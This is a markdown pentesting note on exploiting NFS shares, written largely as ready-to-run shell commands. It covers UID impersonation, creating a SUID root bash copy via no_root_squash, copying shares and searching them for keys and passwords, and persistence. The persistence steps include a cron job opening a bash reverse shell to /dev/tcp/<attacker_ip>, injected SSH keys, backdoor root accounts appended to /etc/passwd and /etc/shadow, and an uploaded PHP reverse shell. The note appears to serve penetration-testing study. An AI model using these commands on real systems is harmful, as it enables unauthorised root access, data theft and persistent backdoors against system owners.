---
id: Exploitation
aliases:
  - Network File System
tags:
  - Networking/Services/NFS/Exploitation
links: "[[Services]]"
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- UID Manipulation {{{-->
## UID Manipulation

With
[UID Manipulation](https://hackviser.com/tactics/pentesting/services/nfs#uid-manipulation)
(or [Trusting UID and GID](https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html#trusting-uid-and-gid))
it is possible to impersonate an arbitrary user
(*or* `root` *(*`UID` *0)* *if* `no_root_squash` *is enabled*)
which the remote file system trusts

> [!example]-
>
> 1. Check file ownership on the share
>
> ```sh
> ls -lan /mnt/nfs
> ```
> > [!info]
> >
> > e.g., *file owned by* `UID 1000`
>
> 2. Create user with same UID
>
> ```sh
> useradd -u 1000 fakeuser
> ```
>
> 3. Switch to the new user
>
> ```sh
> su <fakeuser>
> ```
>
> 4. Mount share
>
>```sh
> >mount -t nfs <target>:/<share> /mnt/nfs
> >```
>
> 5. It is now possible to read/write files owned by `UID 1000`
>
> ```sh
> cat /mnt/nfs/<sensitive_file.txt>
> ```

<!-- Tip {{{-->
> [!tip]
>
> The tool [fuse_nfs](https://github.com/hvs-consulting/nfs-security-tooling)
> will send the needed `UID` and `GID` to access the file(s)
<!-- }}} -->

___

<!-- }}} -->

<!-- No Root Squashing {{{-->
## No Root Squashing

When root squashing (`no_root_squash`) is disabled, the `root` user
on the client maintains `root` privileges on the NFS share,
allowing privilege escalation

1. Check if `no_root_squash` is set

```sh
showmount -e <target>
```

2. Mount share

```sh
mount -t nfs <target>:/<share> /mnt/nfs
```

3. Create file as `root`

```sh
echo "test" > /mnt/nfs/root_file.txt
```

4. Check file permissions

```sh
ls -al <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ls -al /mnt/nfs/root_file.txt
> ```
> ```sh
> -rw-r--r-- 1 root root
> ```
<!-- }}} -->

5. Create [[Permissions#SUID & SGID|SUID]] shell

```
cp /bin/bash /mnt/nfs/rootbash
```
```sh
chmod +s /mnt/nfs/rootbash
```

6. Execute on the target system

```sh
./rootbash -p
```

___

<!-- }}} -->

<!-- NSFShell {{{-->
## NSFShell

[nfsshell](https://github.com/Supermathie/nfsshell) â€”
List, mount and change `UID` and `GID` to have access to files

> [!todo]

___

<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

___

<!-- NFS Operations {{{-->
## NFS Operations

Copy entire share

```sh
rsync -av /mnt/nfs/ /tmp/exfiltrated_data/
```

Compress and download (*from target to attacker machine*)

```sh
tar czf nfs_data.tar.gz /mnt/nfs
```

Find sensitive files

```sh
find /mnt/nfs -name "*.key" -o -name "*.pem" -o -name "*password*" -o -name "*user*"
```

<!-- }}} -->

<!-- Persistence {{{-->
## Persistence

<!-- Writable Share Exploitation {{{-->
### Writable Share Exploitation

[Writable Share Exploitation](https://hackviser.com/tactics/pentesting/services/nfs#writable-share-exploitation)
allows to upload backdoors, modify system files, or inject malicious code

Upload SSH key

<!-- Example {{{-->
> [!example]-
>
> ```sh
> mkdir -p /mnt/nfs/root/.ssh
> ```
> ```sh
> cp id_rsa.pub /mnt/nfs/root/.ssh/authorized_keys
> ```
> ```sh
> chmod 600 /mnt/nfs/root/.ssh/authorized_keys
> ```
<!-- }}} -->

Upload [[Privesc/Scheduled Tasks|cron job]]

<!-- Example {{{-->
> [!example]-
>
>```sh
>echo "* * * * * root bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1" > /mnt/nfs/etc/cron.d/backdoor
>```
<!-- }}} -->

Upload `/etc/passwd` backdoor

<!-- Example {{{-->
> [!example]-
>
> ```sh
> echo "hacker:\$6\$salt\$hash" >> /mnt/nfs/etc/shadow
> echo "backdoor::0:0:root:/root:/bin/bash" >> /mnt/nfs/etc/passwd
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Reverse Shell Over Website {{{-->
### Reverse Shell Over Website

Upload PHP webshell (*if the macnine is web accessible*)

<!-- Example {{{-->
1. Download the payload

```sh
wget <url> -O <out_file>
```

> [!example]-
>
> ```sh
> wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
> ```

2. Edit and check the script variables

> [!example]-
>
> ```php
> $ip = '<attacker_ip>';
> $port = 1234;
> ```

3. Upload the payload to the target machine

```sh
put <file>
```

```sh
cp shell.php /mnt/nfs/var/www/html/shell.php
```

> [!example]-
>
> ```sh
> ftp> put shell.php
> ```

4. Open a [[netcat#Reverse Shell|Netcat listener]]

```sh
nc -lvnp <port>
```

> [!example]-
>
> ```sh
> nc -lvnp <port>
> ```

5. Navigate to the web address to trigger the reverse connection

```sh
http://<target>/<path/to/ftp>/<shell>
```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
